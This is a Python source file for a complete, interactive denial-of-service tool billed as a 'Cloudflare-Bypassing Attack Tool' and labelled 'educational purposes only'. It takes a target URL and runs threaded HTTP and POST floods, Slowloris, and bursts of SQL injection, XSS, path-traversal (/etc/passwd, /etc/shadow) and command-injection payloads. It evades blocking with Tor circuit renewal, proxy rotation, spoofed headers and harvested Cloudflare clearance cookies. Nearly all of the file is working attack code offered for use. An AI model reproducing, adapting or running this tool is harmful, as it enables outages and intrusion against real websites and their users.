import os
import requests
import random
import time
import logging
import socket
import socks
import ssl
import urllib3
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from stem import Signal
from stem.control import Controller
from bs4 import BeautifulSoup
import cloudscraper

########################################
#       Educational purpose only       #
########################################

# Initialize colorama
init()

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging with colors
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


class ColorFormatter(logging.Formatter):
    COLORS = {
        'WARNING': Fore.YELLOW,
        'INFO': Fore.GREEN,
        'ERROR': Fore.RED,
        'CRITICAL': Fore.RED + Style.BRIGHT
    }

    def format(self, record):
        color = self.COLORS.get(record.levelname, '')
        message = super().format(record)
        return f"{color}{message}{Style.RESET_ALL}"


# Apply color formatter
handler = logging.StreamHandler()
handler.setFormatter(ColorFormatter())
logging.getLogger().handlers = [handler]


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    clear_screen()
    banner = f"""
{Fore.RED}
â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•     â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•
{Fore.YELLOW}
                [ Cloudflare-Bypassing Attack Tool ]
{Fore.CYAN}
                Educational purposes only!
{Style.RESET_ALL}
"""
    print(banner)


print_banner()


# Configuration
class Config:

    def __init__(self):
        self.url = ""
        self.num_threads = 100
        self.request_rate = 5  # Lower rate to avoid triggering Cloudflare
        self.attack_duration = 0  # 0 means infinite
        self.attack_type = "http_flood"
        self.proxy_enabled = True  # Enabled by default for Cloudflare bypass
        self.proxy_list = []
        self.user_agents = UserAgent()
        self.referers = self.load_referers()
        self.payloads = self.load_payloads()
        self.attack_params = {}
        self.use_tor = False
        self.cf_bypass = True  # Cloudflare bypass enabled by default
        self.cookie_jar = {}

    def load_referers(self):
        return [
            "https://www.google.com/", "https://www.facebook.com/",
            "https://www.youtube.com/", "https://www.amazon.com/",
            "https://www.reddit.com/", "https://www.twitter.com/",
            "https://www.instagram.com/", "https://www.linkedin.com/",
            "https://www.pinterest.com/", "https://www.tumblr.com/"
        ]

    def load_payloads(self):
        return {
            "sql_injection": [
                "' OR '1'='1", "' OR 1=1--", "admin'--", "1' ORDER BY 1--",
                "1' UNION SELECT null, table_name FROM information_schema.tables--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>", "<body onload=alert('XSS')>"
            ],
            "lfi": [
                "../../../../etc/passwd", "../../../../etc/shadow",
                "../../../../windows/win.ini",
                "....//....//....//....//etc/passwd"
            ],
            "command_injection": ["; ls -la", "| dir", "& whoami", "`id`"]
        }


config = Config()


def renew_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(
                password="")  # Add your Tor password if set
            controller.signal(Signal.NEWNYM)
            time.sleep(5)  # Wait for new circuit
    except Exception as e:
        logging.error(f"Tor IP renewal failed: {e}")


def get_proxy():
    if config.use_tor:
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        renew_tor_ip()
        return None
    elif config.proxy_enabled and config.proxy_list:
        proxy = random.choice(config.proxy_list)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    return None


def get_cloudflare_cookies(target_url):
    try:
        scraper = cloudscraper.create_scraper()
        response = scraper.get(target_url)
        if '__cfduid' in response.cookies or 'cf_clearance' in response.cookies:
            cookies = {
                '__cfduid': response.cookies.get('__cfduid', ''),
                'cf_clearance': response.cookies.get('cf_clearance', '')
            }
            config.cookie_jar = cookies
            logging.info("Obtained Cloudflare cookies successfully")
            return cookies
    except Exception as e:
        logging.error(f"Failed to get Cloudflare cookies: {e}")
    return {}


def get_user_input():
    config.url = input(
        f"{Fore.CYAN}Target URL (include http:// or https://): {Style.RESET_ALL}"
    ).strip()

    if not config.url.startswith(("http://", "https://")):
        logging.error("Invalid URL. Please include http:// or https://")
        exit()

    try:
        config.num_threads = int(
            input(
                f"{Fore.CYAN}Number of threads (default 100): {Style.RESET_ALL}"
            ) or 100)
        config.request_rate = float(
            input(
                f"{Fore.CYAN}Request rate per thread (default 5): {Style.RESET_ALL}"
            ) or 5)
        config.attack_duration = int(
            input(
                f"{Fore.CYAN}Attack duration in seconds (0 for infinite): {Style.RESET_ALL}"
            ) or 0)

        print(f"\n{Fore.YELLOW}Available attack types:{Style.RESET_ALL}")
        print(f"1. HTTP Flood (default)")
        print("2. Slowloris")
        print("3. POST Flood")
        print("4. Mixed Attack")
        print("5. Randomized Payload Attack")

        attack_choice = input(
            f"{Fore.CYAN}Select attack type (1-5, default 1): {Style.RESET_ALL}"
        ) or "1"

        if attack_choice == "1":
            config.attack_type = "http_flood"
        elif attack_choice == "2":
            config.attack_type = "slowloris"
        elif attack_choice == "3":
            config.attack_type = "post_flood"
        elif attack_choice == "4":
            config.attack_type = "mixed"
        elif attack_choice == "5":
            config.attack_type = "payload"
        else:
            config.attack_type = "http_flood"

        if config.attack_type in ["post_flood", "mixed", "payload"]:
            print(f"\n{Fore.YELLOW}Available payload types:{Style.RESET_ALL}")
            print("1. SQL Injection")
            print("2. XSS")
            print("3. LFI")
            print("4. Command Injection")
            print("5. All (default)")

            payload_choice = input(
                f"{Fore.CYAN}Select payload type (1-5, default 5): {Style.RESET_ALL}"
            ) or "5"

            if payload_choice == "1":
                config.attack_params["payload_type"] = "sql_injection"
            elif payload_choice == "2":
                config.attack_params["payload_type"] = "xss"
            elif payload_choice == "3":
                config.attack_params["payload_type"] = "lfi"
            elif payload_choice == "4":
                config.attack_params["payload_type"] = "command_injection"
            else:
                config.attack_params["payload_type"] = "all"

        proxy_choice = input(
            f"{Fore.CYAN}Use proxies? (y/N): {Style.RESET_ALL}").lower() or "n"
        if proxy_choice == "y":
            config.proxy_enabled = True
            load_proxies()

        tor_choice = input(
            f"{Fore.CYAN}Use Tor for IP rotation? (y/N): {Style.RESET_ALL}"
        ).lower() or "n"
        if tor_choice == "y":
            config.use_tor = True

        cf_choice = input(
            f"{Fore.CYAN}Enable Cloudflare bypass? (Y/n): {Style.RESET_ALL}"
        ).lower() or "y"
        config.cf_bypass = cf_choice == "y"

        if config.cf_bypass:
            get_cloudflare_cookies(config.url)

    except ValueError:
        logging.error("Invalid input. Please enter a valid number.")
        exit()


def load_proxies():
    try:
        proxy_file = input(
            f"{Fore.CYAN}Enter path to proxy file (leave empty for default proxies.txt): {Style.RESET_ALL}"
        ) or "proxies.txt"
        with open(proxy_file, 'r') as f:
            config.proxy_list = [line.strip() for line in f if line.strip()]
            logging.info(f"Loaded {len(config.proxy_list)} proxies")
    except FileNotFoundError:
        logging.error("Proxy file not found. Continuing without proxies.")
        config.proxy_enabled = False


def generate_random_string(length=10):
    return ''.join(
        random.choices(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
            k=length))


def generate_random_payload():
    if "payload_type" not in config.attack_params or config.attack_params[
            "payload_type"] == "all":
        attack_type = random.choice(list(config.payloads.keys()))
    else:
        attack_type = config.attack_params["payload_type"]

    return random.choice(config.payloads[attack_type])


def get_headers():
    headers = {
        'User-Agent': config.user_agents.random,
        'Referer': random.choice(config.referers),
        'Accept':
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }

    if config.cf_bypass and config.cookie_jar:
        headers['Cookie'] = '; '.join(
            [f"{k}={v}" for k, v in config.cookie_jar.items()])

    return headers


def http_flood_attack():
    try:
        headers = get_headers()
        params = {
            'param1': generate_random_string(5),
            'param2': generate_random_string(8),
            'param3': generate_random_string(10)
        }

        proxies = get_proxy()

        randomized_url = f"{config.url}?{generate_random_string(3)}={generate_random_string(5)}"

        if config.cf_bypass:
            scraper = cloudscraper.create_scraper()
            response = scraper.get(randomized_url,
                                   headers=headers,
                                   params=params,
                                   proxies=proxies,
                                   timeout=10)
        else:
            response = requests.get(randomized_url,
                                    headers=headers,
                                    params=params,
                                    proxies=proxies,
                                    verify=False,
                                    timeout=10)

        logging.info(
            f"Request to {randomized_url} - Status: {response.status_code}")
    except Exception as e:
        logging.error(f"Error in HTTP flood: {str(e)}")


def slowloris_attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        parsed_url = urllib3.util.parse_url(config.url)
        host = parsed_url.host
        port = parsed_url.port or (80 if parsed_url.scheme == 'http' else 443)
        path = parsed_url.path or '/'

        if parsed_url.scheme == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))

        headers = get_headers()
        headers_str = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])

        request = (f"GET {path} HTTP/1.1\r\n"
                   f"Host: {host}\r\n"
                   f"{headers_str}\r\n")

        s.send(request.encode())

        # Send partial headers periodically to keep connection open
        while True:
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(10)
            except:
                break

    except Exception as e:
        logging.error(f"Slowloris error: {str(e)}")
    finally:
        try:
            s.close()
        except:
            pass


def post_flood_attack():
    try:
        headers = get_headers()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'

        data = {
            'username': generate_random_string(8),
            'password': generate_random_string(12),
            'email': f"{generate_random_string(8)}@example.com",
            'csrf_token': generate_random_string(32),
            'payload': generate_random_payload()
        }

        proxies = get_proxy()

        if config.cf_bypass:
            scraper = cloudscraper.create_scraper()
            response = scraper.post(config.url,
                                    headers=headers,
                                    data=data,
                                    proxies=proxies,
                                    timeout=10)
        else:
            response = requests.post(config.url,
                                     headers=headers,
                                     data=data,
                                     proxies=proxies,
                                     verify=False,
                                     timeout=10)

        logging.info(
            f"POST request to {config.url} - Status: {response.status_code}")
    except Exception as e:
        logging.error(f"Error in POST flood: {str(e)}")


def mixed_attack():
    attack_type = random.choice(["http_flood", "post_flood"])
    if attack_type == "http_flood":
        http_flood_attack()
    else:
        post_flood_attack()


def payload_attack():
    try:
        headers = get_headers()

        params = {
            'param1': generate_random_payload(),
            'param2': generate_random_payload(),
            'param3': generate_random_string(10)
        }

        proxies = get_proxy()

        if config.cf_bypass:
            scraper = cloudscraper.create_scraper()
            response = scraper.get(config.url,
                                   headers=headers,
                                   params=params,
                                   proxies=proxies,
                                   timeout=10)
        else:
            response = requests.get(config.url,
                                    headers=headers,
                                    params=params,
                                    proxies=proxies,
                                    verify=False,
                                    timeout=10)

        logging.info(
            f"Payload attack to {config.url} - Status: {response.status_code}")
    except Exception as e:
        logging.error(f"Error in payload attack: {str(e)}")


def attack_worker():
    start_time = time.time()

    while True:
        if config.attack_duration > 0 and (
                time.time() - start_time) > config.attack_duration:
            break

        try:
            # Rotate Tor IP every 10 requests if enabled
            if config.use_tor and random.randint(1, 10) == 1:
                renew_tor_ip()

            if config.attack_type == "http_flood":
                http_flood_attack()
            elif config.attack_type == "slowloris":
                slowloris_attack()
            elif config.attack_type == "post_flood":
                post_flood_attack()
            elif config.attack_type == "mixed":
                mixed_attack()
            elif config.attack_type == "payload":
                payload_attack()

            time.sleep(1 / config.request_rate)
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.error(f"Worker error: {str(e)}")
            time.sleep(1)


def main():
    get_user_input()

    logging.info(f"Starting attack on {config.url}")
    logging.info(f"Threads: {config.num_threads}")
    logging.info(f"Request rate: {config.request_rate} per thread")
    logging.info(f"Attack type: {config.attack_type}")
    if config.attack_duration > 0:
        logging.info(f"Attack duration: {config.attack_duration} seconds")
    else:
        logging.info("Attack duration: infinite")
    if config.proxy_enabled:
        logging.info(f"Using proxies: {len(config.proxy_list)} loaded")
    if config.use_tor:
        logging.info("Using Tor for IP rotation")
    if config.cf_bypass:
        logging.info("Cloudflare bypass enabled")

    try:
        with ThreadPoolExecutor(max_workers=config.num_threads) as executor:
            futures = [
                executor.submit(attack_worker)
                for _ in range(config.num_threads)
            ]

            for future in as_completed(futures):
                if future.exception() is not None:
                    logging.error("Thread error", exc_info=future.exception())

    except KeyboardInterrupt:
        logging.info("\nAttack stopped by user")
    finally:
        logging.info("Attack finished")


if __name__ == "__main__":
    main()
